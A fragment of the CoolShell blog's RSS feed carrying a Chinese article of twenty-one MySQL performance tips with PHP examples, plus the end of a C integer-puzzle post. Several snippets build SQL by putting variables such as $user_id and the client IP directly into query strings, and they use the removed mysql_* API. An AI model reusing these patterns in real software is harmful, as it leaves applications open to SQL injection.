+<p>7. 错。INT_MAX 和 INT_MAX</p>
+<p>8. 正确。</p>
+<p>9. 错。INT_MIN<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/10/edsm-150x150.gif" alt="State Threads 回调终结者" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a></li><li ><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/04/c99-150x150.jpg" alt="C语言的整型溢出问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11466.html" class="wp_rp_title">C语言的整型溢出问题</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1857.html">C 语言整型谜题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1857.html/feed</wfw:commentRss>
+			<slash:comments>13</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>MySQL性能优化的最佳20+条经验</title>
+		<link>https://coolshell.cn/articles/1846.html</link>
+					<comments>https://coolshell.cn/articles/1846.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 27 Nov 2009 10:57:33 +0000</pubDate>
+				<category><![CDATA[PHP脚本]]></category>
+		<category><![CDATA[数据库]]></category>
+		<category><![CDATA[Database]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[PHP]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1846</guid>
+
+					<description><![CDATA[<p>今天，数据库的操作越来越成为整个应用的性能瓶颈了，这点对于Web应用尤其明显。关于数据库的性能，这并不只是DBA才需要担心的事，而这更是我们程序员需要去关注的事...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1846.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1846.html">MySQL性能优化的最佳20+条经验</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>今天，数据库的操作越来越成为整个应用的性能瓶颈了，这点对于Web应用尤其明显。关于数据库的性能，这并不只是DBA才需要担心的事，而这更是我们程序员需要去关注的事情。当我们去设计数据库表结构，对操作数据库时（尤其是查表时的SQL语句），我们都需要注意数据操作的性能。这里，我们不会讲过多的SQL语句的优化，而只是针对MySQL这一Web应用最多的数据库。希望下面的这些优化技巧对你有用。</p>
+<h4>1. 为查询缓存优化你的查询</h4>
+<p>大多数的MySQL服务器都开启了查询缓存。这是提高性最有效的方法之一，而且这是被MySQL的数据库引擎处理的。当有很多相同的查询被执行了多次的时候，这些查询结果会被放到一个缓存中，这样，后续的相同的查询就不用操作表而直接访问缓存结果了。</p>
+<p>这里最主要的问题是，对于程序员来说，这个事情是很容易被忽略的。因为，我们某些查询语句会让MySQL不使用缓存。请看下面的示例：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+// 查询缓存不开启
+$r = mysql_query(&quot;SELECT username FROM user WHERE signup_date &gt;= CURDATE()&quot;);
+
+// 开启查询缓存
+$today = date(&quot;Y-m-d&quot;);
+$r = mysql_query(&quot;SELECT username FROM user WHERE signup_date &gt;= &#039;$today&#039;&quot;);
+</pre>
+<p>上面两条SQL语句的差别就是 CURDATE() ，MySQL的查询缓存对这个函数不起作用。所以，像 NOW() 和 RAND() 或是其它的诸如此类的SQL函数都不会开启查询缓存，因为这些函数的返回是会不定的易变的。所以，你所需要的就是用一个变量来代替MySQL的函数，从而开启缓存。</p>
+<p><span id="more-1846"></span></p>
+<h4>2. EXPLAIN 你的 SELECT 查询</h4>
+<p>使用 <a href="http://dev.mysql.com/doc/refman/5.0/en/explain.html" target="_blank">EXPLAIN</a> 关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。</p>
+<p>EXPLAIN 的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的……等等，等等。</p>
+<p>挑一个你的SELECT语句（推荐挑选那个最复杂的，有多表联接的），把关键字EXPLAIN加到前面。你可以使用phpmyadmin来做这个事。然后，你会看到一张表格。下面的这个示例中，我们忘记加上了group_id索引，并且有表联接：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/500_mysql/unoptimized_explain.jpg" border="0" alt="" /></div>
+<p>当我们为 group_id 字段加上索引后：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/500_mysql/optimized_explain.jpg" border="0" alt="" /></div>
+<p>我们可以看到，前一个结果显示搜索了 7883 行，而后一个只是搜索了两个表的 9 和 16 行。查看rows列可以让我们找到潜在的性能问题。</p>
+<h4>3. 当只要一行数据时使用 LIMIT 1</h4>
+<p>当你查询表的有些时候，你已经知道结果只会有一条结果，但因为你可能需要去fetch游标，或是你也许会去检查返回的记录数。</p>
+<p>在这种情况下，加上 LIMIT 1 可以增加性能。这样一样，MySQL数据库引擎会在找到一条数据后停止搜索，而不是继续往后查少下一条符合记录的数据。</p>
+<p>下面的示例，只是为了找一下是否有“中国”的用户，很明显，后面的会比前面的更有效率。（请注意，第一条中是Select *，第二条是Select 1）</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+
+// 没有效率的：
+$r = mysql_query(&quot;SELECT * FROM user WHERE country = &#039;China&#039;&quot;);
+if (mysql_num_rows($r) &gt; 0) {
+	// ...
+}
+
+// 有效率的：
+$r = mysql_query(&quot;SELECT 1 FROM user WHERE country = &#039;China&#039; LIMIT 1&quot;);
+if (mysql_num_rows($r) &gt; 0) {
+	// ...
+}
+</pre>
+<h4>4. 为搜索字段建索引</h4>
+<p>索引并不一定就是给主键或是唯一的字段。如果在你的表中，有某个字段你总要会经常用来做搜索，那么，请为其建立索引吧。</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/500_mysql/search_index.jpg" border="0" alt="" /></div>
+<p>从上图你可以看到那个搜索字串 &#8220;last_name LIKE &#8216;a%'&#8221;，一个是建了索引，一个是没有索引，性能差了4倍左右。</p>
+<p>另外，你应该也需要知道什么样的搜索是不能使用正常的索引的。例如，当你需要在一篇大的文章中搜索一个词时，如： &#8220;WHERE post_content LIKE &#8216;%apple%'&#8221;，索引可能是没有意义的。你可能需要使用<a href="http://dev.mysql.com/doc/refman/5.1/en/fulltext-search.html" target="_blank">MySQL全文索引</a> 或是自己做一个索引（比如说：搜索关键词或是Tag什么的）</p>
+<h4>5. 在Join表的时候使用相当类型的例，并将其索引</h4>
+<p>如果你的应用程序有很多 JOIN 查询，你应该确认两个表中Join的字段是被建过索引的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。</p>
+<p>而且，这些被用来Join的字段，应该是相同的类型的。例如：如果你要把 DECIMAL 字段和一个 INT 字段Join在一起，MySQL就无法使用它们的索引。对于那些STRING类型，还需要有相同的字符集才行。（两个表的字符集有可能不一样）</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+// 在state中查找company
+$r = mysql_query(&quot;SELECT company_name FROM users
+	LEFT JOIN companies ON (users.state = companies.state)
+	WHERE users.id = $user_id&quot;);
+
+// 两个 state 字段应该是被建过索引的，而且应该是相当的类型，相同的字符集。
+</pre>
+<h4>6. 千万不要 ORDER BY RAND()</h4>
+<p>想打乱返回的数据行？随机挑一个数据？真不知道谁发明了这种用法，但很多新手很喜欢这样用。但你确不了解这样做有多么可怕的性能问题。</p>
+<p>如果你真的想把返回的数据行打乱了，你有N种方法可以达到这个目的。这样使用只让你的数据库的性能呈指数级的下降。这里的问题是：MySQL会不得不去执行RAND()函数（很耗CPU时间），而且这是为了每一行记录去记行，然后再对其排序。就算是你用了Limit 1也无济于事（因为要排序）</p>
+<p>下面的示例是随机挑一条记录</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+// 千万不要这样做：
+$r = mysql_query(&quot;SELECT username FROM user ORDER BY RAND() LIMIT 1&quot;);
+
+// 这要会更好：
+$r = mysql_query(&quot;SELECT count(*) FROM user&quot;);
+$d = mysql_fetch_row($r);
+$rand = mt_rand(0,$d[0] - 1);
+
+$r = mysql_query(&quot;SELECT username FROM user LIMIT $rand, 1&quot;);
+</pre>
+<h4>7. 避免 SELECT *</h4>
+<p>从数据库里读出越多的数据，那么查询就会变得越慢。并且，如果你的数据库服务器和WEB服务器是两台独立的服务器的话，这还会增加网络传输的负载。</p>
+<p>所以，你应该养成一个需要什么就取什么的好的习惯。</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+// 不推荐
+$r = mysql_query(&quot;SELECT * FROM user WHERE user_id = 1&quot;);
+$d = mysql_fetch_assoc($r);
+echo &quot;Welcome {$d[&#039;username&#039;]}&quot;;
+
+// 推荐
+$r = mysql_query(&quot;SELECT username FROM user WHERE user_id = 1&quot;);
+$d = mysql_fetch_assoc($r);
+echo &quot;Welcome {$d[&#039;username&#039;]}&quot;;
+</pre>
+<h4>8. 永远为每张表设置一个ID</h4>
+<p>我们应该为数据库里的每张表都设置一个ID做为其主键，而且最好的是一个INT型的（推荐使用UNSIGNED），并设置上自动增加的AUTO_INCREMENT标志。</p>
+<p>就算是你 users 表有一个主键叫 “email”的字段，你也别让它成为主键。使用 VARCHAR 类型来当主键会使用得性能下降。另外，在你的程序中，你应该使用表的ID来构造你的数据结构。</p>
+<p>而且，在MySQL数据引擎下，还有一些操作需要使用主键，在这些情况下，主键的性能和设置变得非常重要，比如，集群，分区……</p>
+<p>在这里，只有一个情况是例外，那就是“关联表”的“外键”，也就是说，这个表的主键，通过若干个别的表的主键构成。我们把这个情况叫做“外键”。比如：有一个“学生表”有学生的ID，有一个“课程表”有课程ID，那么，“成绩表”就是“关联表”了，其关联了学生表和课程表，在成绩表中，学生ID和课程ID叫“外键”其共同组成主键。</p>
+<h4>9. 使用 ENUM 而不是 VARCHAR</h4>
+<p><a href="http://dev.mysql.com/doc/refman/5.0/en/enum.html" target="_blank">ENUM</a> 类型是非常快和紧凑的。在实际上，其保存的是 TINYINT，但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。</p>
+<p>如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用 ENUM 而不是 VARCHAR。</p>
+<p>MySQL也有一个“建议”（见第十条）告诉你怎么去重新组织你的表结构。当你有一个 VARCHAR 字段时，这个建议会告诉你把其改成 ENUM 类型。使用 PROCEDURE ANALYSE() 你可以得到相关的建议。</p>
+<h4>10. 从 PROCEDURE ANALYSE() 取得建议</h4>
+<p><a href="http://dev.mysql.com/doc/refman/5.0/en/procedure-analyse.html" target="_blank">PROCEDURE ANALYSE()</a> 会让 MySQL 帮你去分析你的字段和其实际的数据，并会给你一些有用的建议。只有表中有实际的数据，这些建议才会变得有用，因为要做一些大的决定是需要有数据作为基础的。</p>
+<p>例如，如果你创建了一个 INT 字段作为你的主键，然而并没有太多的数据，那么，PROCEDURE ANALYSE()会建议你把这个字段的类型改成 MEDIUMINT 。或是你使用了一个 VARCHAR 字段，因为数据不多，你可能会得到一个让你把它改成 ENUM 的建议。这些建议，都是可能因为数据不够多，所以决策做得就不够准。</p>
+<p>在phpmyadmin里，你可以在查看表时，点击 &#8220;Propose table structure&#8221; 来查看这些建议</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/500_mysql/suggestions.jpg" border="0" alt="" /></div>
+<p>一定要注意，这些只是建议，只有当你的表里的数据越来越多时，这些建议才会变得准确。一定要记住，你才是最终做决定的人。</p>
+<h4>11. 尽可能的使用 NOT NULL</h4>
+<p>除非你有一个很特别的原因去使用 NULL 值，你应该总是让你的字段保持 NOT NULL。这看起来好像有点争议，请往下看。</p>
+<p>首先，问问你自己“Empty”和“NULL”有多大的区别（如果是INT，那就是0和NULL）？如果你觉得它们之间没有什么区别，那么你就不要使用NULL。（你知道吗？在 Oracle 里，NULL 和 Empty 的字符串是一样的！)</p>
+<p>不要以为 NULL 不需要空间，其需要额外的空间，并且，在你进行比较的时候，你的程序会更复杂。 当然，这里并不是说你就不能使用NULL了，现实情况是很复杂的，依然会有些情况下，你需要使用NULL值。</p>
+<p>下面摘自MySQL自己的文档：</p>
+<blockquote><p>&#8220;NULL columns require additional space in the row to record whether their values are NULL. For MyISAM tables, each NULL column takes one bit extra, rounded up to the nearest byte.&#8221;</p></blockquote>
+<h4>12. Prepared Statements</h4>
+<p>Prepared Statements很像存储过程，是一种运行在后台的SQL语句集合，我们可以从使用 prepared statements 获得很多好处，无论是性能问题还是安全问题。</p>
+<p>Prepared Statements 可以检查一些你绑定好的变量，这样可以保护你的程序不会受到“SQL注入式”攻击。当然，你也可以手动地检查你的这些变量，然而，手动的检查容易出问题，而且很经常会被程序员忘了。当我们使用一些framework或是ORM的时候，这样的问题会好一些。</p>
+<p>在性能方面，当一个相同的查询被使用多次的时候，这会为你带来可观的性能优势。你可以给这些Prepared Statements定义一些参数，而MySQL只会解析一次。</p>
+<p>虽然最新版本的MySQL在传输Prepared Statements是使用二进制形势，所以这会使得网络传输非常有效率。</p>
+<p>当然，也有一些情况下，我们需要避免使用Prepared Statements，因为其不支持查询缓存。但据说版本5.1后支持了。</p>
+<p>在PHP中要使用prepared statements，你可以查看其使用手册：<a href="http://php.net/manual/en/book.mysqli.php" target="_blank">mysqli 扩展</a> 或是使用数据库抽象层，如： <a href="http://us.php.net/manual/en/book.pdo.php" target="_blank">PDO</a>.</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+// 创建 prepared statement
+if ($stmt = $mysqli-&gt;prepare(&quot;SELECT username FROM user WHERE state=?&quot;)) {
+
+	// 绑定参数
+    $stmt-&gt;bind_param(&quot;s&quot;, $state);
+
+	// 执行
+    $stmt-&gt;execute();
+
+	// 绑定结果
+    $stmt-&gt;bind_result($username);
+
+	// 移动游标
+    $stmt-&gt;fetch();
+
+    printf(&quot;%s is from %s\n&quot;, $username, $state);
+
+    $stmt-&gt;close();
+}
+</pre>
+<h4>13. 无缓冲的查询</h4>
+<p>正常的情况下，当你在当你在你的脚本中执行一个SQL语句的时候，你的程序会停在那里直到没这个SQL语句返回，然后你的程序再往下继续执行。你可以使用无缓冲查询来改变这个行为。</p>
+<p>关于这个事情，在PHP的文档中有一个非常不错的说明： <a href="http://php.net/manual/en/function.mysql-unbuffered-query.php" target="_blank">mysql_unbuffered_query()</a> 函数：</p>
+<blockquote><p>&#8220;mysql_unbuffered_query() sends the SQL query query to MySQL without automatically fetching and buffering the result rows as mysql_query() does. This saves a considerable amount of memory with SQL queries that produce large result sets, and you can start working on the result set immediately after the first row has been retrieved as you don&#8217;t have to wait until the complete SQL query has been performed.&#8221;</p></blockquote>
+<p>上面那句话翻译过来是说，mysql_unbuffered_query() 发送一个SQL语句到MySQL而并不像mysql_query()一样去自动fethch和缓存结果。这会相当节约很多可观的内存，尤其是那些会产生大量结果的查询语句，并且，你不需要等到所有的结果都返回，只需要第一行数据返回的时候，你就可以开始马上开始工作于查询结果了。</p>
+<p>然而，这会有一些限制。因为你要么把所有行都读走，或是你要在进行下一次的查询前调用 <a href="http://us2.php.net/manual/en/function.mysql-free-result.php" target="_blank">mysql_free_result()</a> 清除结果。而且， <a href="http://us2.php.net/manual/en/function.mysql-num-rows.php" target="_blank">mysql_num_rows()</a> 或 <a href="http://us2.php.net/manual/en/function.mysql-data-seek.php" target="_blank">mysql_data_seek()</a> 将无法使用。所以，是否使用无缓冲的查询你需要仔细考虑。</p>
+<h4>14. 把IP地址存成 UNSIGNED INT</h4>
+<p>很多程序员都会创建一个 VARCHAR(15) 字段来存放字符串形式的IP而不是整形的IP。如果你用整形来存放，只需要4个字节，并且你可以有定长的字段。而且，这会为你带来查询上的优势，尤其是当你需要使用这样的WHERE条件：IP between ip1 and ip2。</p>
+<p>我们必需要使用UNSIGNED INT，因为 IP地址会使用整个32位的无符号整形。</p>
+<p>而你的查询，你可以使用 <a href="http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_inet-aton" target="_blank">INET_ATON()</a> 来把一个字符串IP转成一个整形，并使用 <a href="http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_inet-ntoa" target="_blank">INET_NTOA()</a> 把一个整形转成一个字符串IP。在PHP中，也有这样的函数 <a href="http://php.net/manual/en/function.ip2long.php" target="_blank">ip2long()</a> 和 <a href="http://us.php.net/manual/en/function.long2ip.php" target="_blank">long2ip()</a>。</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+$r = &quot;UPDATE users SET ip = INET_ATON(&#039;{$_SERVER[&#039;REMOTE_ADDR&#039;]}&#039;) WHERE user_id = $user_id&quot;;
+</pre>
+<h4>15. 固定长度的表会更快</h4>
+<p>如果表中的所有字段都是“固定长度”的，整个表会被认为是 <a href="http://dev.mysql.com/doc/refman/5.1/en/static-format.html" target="_blank">&#8220;static&#8221; 或 &#8220;fixed-length&#8221;</a>。 例如，表中没有如下类型的字段： VARCHAR，TEXT，BLOB。只要你包括了其中一个这些字段，那么这个表就不是“固定长度静态表”了，这样，MySQL 引擎会用另一种方法来处理。</p>
+<p>固定长度的表会提高性能，因为MySQL搜寻得会更快一些，因为这些固定的长度是很容易计算下一个数据的偏移量的，所以读取的自然也会很快。而如果字段不是定长的，那么，每一次要找下一条的话，需要程序找到主键。</p>
+<p>并且，固定长度的表也更容易被缓存和重建。不过，唯一的副作用是，固定长度的字段会浪费一些空间，因为定长的字段无论你用不用，他都是要分配那么多的空间。</p>
+<p>使用“垂直分割”技术（见下一条），你可以分割你的表成为两个一个是定长的，一个则是不定长的。</p>
+<h4>16. 垂直分割</h4>
+<p>“垂直分割”是一种把数据库中的表按列变成几张表的方法，这样可以降低表的复杂度和字段的数目，从而达到优化的目的。（以前，在银行做过项目，见过一张表有100多个字段，很恐怖）</p>
+<p><strong>示例一</strong>：在Users表中有一个字段是家庭地址，这个字段是可选字段，相比起，而且你在数据库操作的时候除了个人信息外，你并不需要经常读取或是改写这个字段。那么，为什么不把他放到另外一张表中呢？ 这样会让你的表有更好的性能，大家想想是不是，大量的时候，我对于用户表来说，只有用户ID，用户名，口令，用户角色等会被经常使用。小一点的表总是会有好的性能。</p>
+<p><strong>示例二</strong>： 你有一个叫 &#8220;last_login&#8221; 的字段，它会在每次用户登录时被更新。但是，每次更新时会导致该表的查询缓存被清空。所以，你可以把这个字段放到另一个表中，这样就不会影响你对用户ID，用户名，用户角色的不停地读取了，因为查询缓存会帮你增加很多性能。</p>
+<p>另外，你需要注意的是，这些被分出去的字段所形成的表，你不会经常性地去Join他们，不然的话，这样的性能会比不分割时还要差，而且，会是极数级的下降。</p>
+<h4>17. 拆分大的 DELETE 或 INSERT 语句</h4>
+<p>如果你需要在一个在线的网站上去执行一个大的 DELETE 或 INSERT 查询，你需要非常小心，要避免你的操作让你的整个网站停止相应。因为这两个操作是会锁表的，表一锁住了，别的操作都进不来了。</p>
+<p>Apache 会有很多的子进程或线程。所以，其工作起来相当有效率，而我们的服务器也不希望有太多的子进程，线程和数据库链接，这是极大的占服务器资源的事情，尤其是内存。</p>
+<p>如果你把你的表锁上一段时间，比如30秒钟，那么对于一个有很高访问量的站点来说，这30秒所积累的访问进程/线程，数据库链接，打开的文件数，可能不仅仅会让你泊WEB服务Crash，还可能会让你的整台服务器马上掛了。</p>
+<p>所以，如果你有一个大的处理，你定你一定把其拆分，使用 LIMIT 条件是一个好的方法。下面是一个示例：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">
+while (1) {
+    //每次只做1000条
+	mysql_query(&quot;DELETE FROM logs WHERE log_date &lt;= &#039;2009-11-01&#039; LIMIT 1000&quot;);
+	if (mysql_affected_rows() == 0) {
+		// 没得可删了，退出！
+		break;
+	}
+	// 每次都要休息一会儿
+	usleep(50000);
+}
+</pre>
+<h4>18. 越小的列会越快</h4>
+<p>对于大多数的数据库引擎来说，硬盘操作可能是最重大的瓶颈。所以，把你的数据变得紧凑会对这种情况非常有帮助，因为这减少了对硬盘的访问。</p>
+<p>参看 MySQL 的文档 <a href="http://dev.mysql.com/doc/refman/5.0/en/storage-requirements.html" target="_blank">Storage Requirements</a> 查看所有的数据类型。</p>
+<p>如果一个表只会有几列罢了（比如说字典表，配置表），那么，我们就没有理由使用 INT 来做主键，使用 MEDIUMINT, SMALLINT 或是更小的 TINYINT 会更经济一些。如果你不需要记录时间，使用 DATE 要比 DATETIME 好得多。</p>
+<p>当然，你也需要留够足够的扩展空间，不然，你日后来干这个事，你会死的很难看，参看<a href="http://news.slashdot.org/article.pl?sid=06/11/09/1534204" target="_blank">Slashdot的例子</a>（2009年11月06日），一个简单的ALTER TABLE语句花了3个多小时，因为里面有一千六百万条数据。</p>
+<h4>19. 选择正确的存储引擎</h4>
+<p>在 MySQL 中有两个存储引擎 MyISAM 和 InnoDB，每个引擎都有利有弊。酷壳以前文章《<a href="https://coolshell.cn/articles/652.html" target="_blank">MySQL: InnoDB 还是 MyISAM?</a>》讨论和这个事情。</p>
+<p>MyISAM 适合于一些需要大量查询的应用，但其对于有大量写操作并不是很好。甚至你只是需要update一个字段，整个表都会被锁起来，而别的进程，就算是读进程都无法操作直到读操作完成。另外，MyISAM 对于 SELECT COUNT(*) 这类的计算是超快无比的。</p>
+<p>InnoDB 的趋势会是一个非常复杂的存储引擎，对于一些小的应用，它会比 MyISAM 还慢。他是它支持“行锁” ，于是在写操作比较多的时候，会更优秀。并且，他还支持更多的高级应用，比如：事务。</p>
+<p>下面是MySQL的手册</p>
+<ul>
+<li><a href="http://dev.mysql.com/doc/refman/5.1/en/myisam-storage-engine.html">target=&#8221;_blank&#8221;MyISAM Storage Engine</a></li>
+<li><a href="http://dev.mysql.com/doc/refman/5.1/en/innodb.html" target="_blank">InnoDB Storage Engine</a></li>
+</ul>
+<h4>20. 使用一个对象关系映射器（Object Relational Mapper）</h4>
+<p>使用 ORM (Object Relational Mapper)，你能够获得可靠的性能增涨。一个ORM可以做的所有事情，也能被手动的编写出来。但是，这需要一个高级专家。</p>
+<p>ORM 的最重要的是“Lazy Loading”，也就是说，只有在需要的去取值的时候才会去真正的去做。但你也需要小心这种机制的副作用，因为这很有可能会因为要去创建很多很多小的查询反而会降低性能。</p>
+<p>ORM 还可以把你的SQL语句打包成一个事务，这会比单独执行他们快得多得多。</p>
+<p>目前，个人最喜欢的PHP的ORM是：<a href="http://www.doctrine-project.org" target="_blank">Doctrine</a>。</p>
+<h4>21. 小心“永久链接”</h4>
+<p>“永久链接”的目的是用来减少重新创建MySQL链接的次数。当一个链接被创建了，它会永远处在连接的状态，就算是数据库操作已经结束了。而且，自从我们的Apache开始重用它的子进程后——也就是说，下一次的HTTP请求会重用Apache的子进程，并重用相同的 MySQL 链接。</p>
+<ul>
+<li><a href="http://php.net/manual/en/function.mysql-pconnect.php" target="_blank">PHP手册：mysql_pconnect() </a></li>
+</ul>
+<p>在理论上来说，这听起来非常的不错。但是从个人经验（也是大多数人的）上来说，这个功能制造出来的麻烦事更多。因为，你只有有限的链接数，内存问题，文件句柄数，等等。</p>
+<p>而且，Apache 运行在极端并行的环境中，会创建很多很多的了进程。这就是为什么这种“永久链接”的机制工作地不好的原因。在你决定要使用“永久链接”之前，你需要好好地考虑一下你的整个系统的架构。</p>
+<p>文章：<a href="http://net.tutsplus.com/tutorials/other/top-20-mysql-best-practices/" target="_blank">来源</a></p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="开源中最好的Web开发的资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a></li><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/1889.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/sql.where_.clause-150x150.jpg" alt="SQL的Where语句" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1889.html" class="wp_rp_title">SQL的Where语句</a></li><li ><a href="https://coolshell.cn/articles/652.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/17.jpg" alt="MySQL: InnoDB 还是 MyISAM?" width="150" height="150" /></a><a href="https://coolshell.cn/articles/652.html" class="wp_rp_title">MySQL: InnoDB 还是 MyISAM?</a></li><li ><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/muxnt-150x150.jpg" alt="代码执行的效率" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_title">代码执行的效率</a></li><li ><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg" alt="性能调优攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1846.html">MySQL性能优化的最佳20+条经验</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1846.html/feed</wfw:commentRss>
+			<slash:comments>169</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>编程语言汽车</title>
+		<link>https://coolshell.cn/articles/1839.html</link>
+					<comments>https://coolshell.cn/articles/1839.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 24 Nov 2009 10:24:22 +0000</pubDate>
+				<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Basic]]></category>
+		<category><![CDATA[C++]]></category>
+		<category><![CDATA[Erlang]]></category>
+		<category><![CDATA[Haskell]]></category>
+		<category><![CDATA[Lisp]]></category>
+		<category><![CDATA[Perl]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Python]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1839</guid>
+
